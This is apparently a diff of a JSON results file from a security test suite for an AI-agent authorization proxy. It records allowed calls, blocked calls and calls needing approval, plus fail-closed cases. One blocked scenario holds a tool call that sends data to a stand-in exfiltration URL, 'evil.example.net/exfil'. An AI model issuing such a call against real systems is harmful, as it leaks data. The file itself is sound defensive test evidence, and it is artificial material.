@@ -1,5 +1,8 @@
 {
+  "commit_sha": "5d42b12bded275dc3cee608ae9bd232dc8b75da0",
   "corpus": "examples/external-auth/scenarios",
+  "envelope_note": "ASC envelopes are recorded for BLOCK/REQUIRE_APPROVAL rows decided by ASC or the adapter.",
+  "evidence_generator": "the external-auth integration runner",
   "metrics": {
     "allow_scenario_count": 6,
     "attack_scenario_count": 6,
@@ -12,6 +15,7 @@
   },
   "passed": true,
   "policy": "policy/demo-agent.policy.yaml",
+  "results_ref": "results/external-auth-results.json",
   "scenarios": [
     {
       "acs_controls": [
@@ -20,6 +24,7 @@
       ],
       "actual": "ALLOW",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": null,
       "executed": true,
       "expected": "ALLOW",
@@ -39,6 +44,7 @@
       ],
       "actual": "ALLOW",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": null,
       "executed": true,
       "expected": "ALLOW",
@@ -58,6 +64,7 @@
       ],
       "actual": "ALLOW",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": null,
       "executed": true,
       "expected": "ALLOW",
@@ -77,6 +84,7 @@
       ],
       "actual": "ALLOW",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": null,
       "executed": true,
       "expected": "ALLOW",
@@ -96,6 +104,7 @@
       ],
       "actual": "ALLOW",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": null,
       "executed": true,
       "expected": "ALLOW",
@@ -115,6 +124,7 @@
       ],
       "actual": "ALLOW",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": null,
       "executed": true,
       "expected": "ALLOW",
@@ -134,6 +144,7 @@
       ],
       "actual": "BLOCK",
       "blocked_call_id": "c2",
+      "deny_source": null,
       "envelope": {
         "acs_disposition": "DENY",
         "blocked_call_id": "c2",
@@ -146,13 +157,13 @@
           "argument": "url",
           "value": "https://evil.example.net/exfil?d=1"
         },
-        "envelope_sha256": "sha256:083e4f41547872580b4d6afbe215852de0bebfc1583396aeeb8c8f0afd28c260",
+        "envelope_sha256": "sha256:cda51bcf88d7d9b22abce61008f73ba50d0e93c6dad172a865f1afb413bb652b",
         "policy_sha256": "sha256:55aa4940ada17f1c8924a950aaf35e63ce8d59d8a3f35f6f961220b4bf9ce06a",
         "policy_version": "1",
         "reason": "host not allowlisted for http.fetch.url",
         "scenario_id": "proxy_block_exfil",
         "schema_version": "1.0.0",
-        "timestamp": "2026-10-22T08:22:34Z",
+        "timestamp": "2026-10-22T08:34:48Z",
         "trace_id": "t-exfil",
         "verdict": "BLOCK"
       },
@@ -174,6 +185,7 @@
       ],
       "actual": "REQUIRE_APPROVAL",
       "blocked_call_id": "c1",
+      "deny_source": null,
       "envelope": {
         "acs_disposition": "ASK",
         "blocked_call_id": "c1",
@@ -181,13 +193,13 @@
         "details": {
           "tool": "deploy.production"
         },
-        "envelope_sha256": "sha256:45745b7e4d7d0ceeae2b22abff5848c72bf6873edf26450a6d6c56b655432e68",
+        "envelope_sha256": "sha256:dfce2dccbd2a3e2909ba2d0e5b9abdc687e9c56d11a7ba6b0794c3b45e4db617",
         "policy_sha256": "sha256:55aa4940ada17f1c8924a950aaf35e63ce8d59d8a3f35f6f961220b4bf9ce06a",
         "policy_version": "1",
         "reason": "high-impact tool requires approval: deploy.production",
         "scenario_id": "proxy_require_approval_deploy",
         "schema_version": "1.0.0",
-        "timestamp": "2026-10-22T08:22:35Z",
+        "timestamp": "2026-10-22T08:34:48Z",
         "trace_id": "t-unapproved-deploy",
         "verdict": "REQUIRE_APPROVAL"
       },
@@ -209,6 +221,7 @@
       ],
       "actual": "BLOCK",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": {
         "acs_disposition": "DENY",
         "reason": "malformed tool-call body (fail-closed): Expecting property name enclosed in double quotes: line 1 column 2 (char 1)",
@@ -233,6 +246,7 @@
       ],
       "actual": "BLOCK",
       "blocked_call_id": null,
+      "deny_source": null,
       "envelope": {
         "acs_disposition": "DENY",
         "reason": "missing or invalid credentials (fail-closed)",
@@ -257,13 +271,14 @@
       ],
       "actual": "BLOCK",
       "blocked_call_id": null,
+      "deny_source": "envoy_ext_authz_failure_path",
       "envelope": null,
       "executed": false,
       "expected": "BLOCK",
       "http_status": 403,
       "match": true,
       "owasp_risk": "ASI02 Tool Misuse & Exploitation / Authorizer Timeout",
-      "reason": "http_status=403",
+      "reason": "envoy ext_authz failure path (timeout); HTTP 403 (no ASC envelope)",
       "scenario_id": "proxy_fail_closed_timeout",
       "severity": "high",
       "source": "proxy_fail_closed_timeout.json",
@@ -276,18 +291,19 @@
       ],
       "actual": "BLOCK",
       "blocked_call_id": null,
+      "deny_source": "envoy_ext_authz_failure_path",
       "envelope": null,
       "executed": false,
       "expected": "BLOCK",
       "http_status": 403,
       "match": true,
       "owasp_risk": "ASI02 Tool Misuse & Exploitation / Authorizer Unavailable",
-      "reason": "http_status=403",
+      "reason": "envoy ext_authz failure path (down); HTTP 403 (no ASC envelope)",
       "scenario_id": "proxy_fail_closed_authorizer_down",
       "severity": "high",
       "source": "proxy_fail_closed_authorizer_down.json",
       "title": "Proxy fail-closed when authorizer is down"
     }
   ],
-  "suite_time_ms": 19510
+  "suite_time_ms": 17327
 }
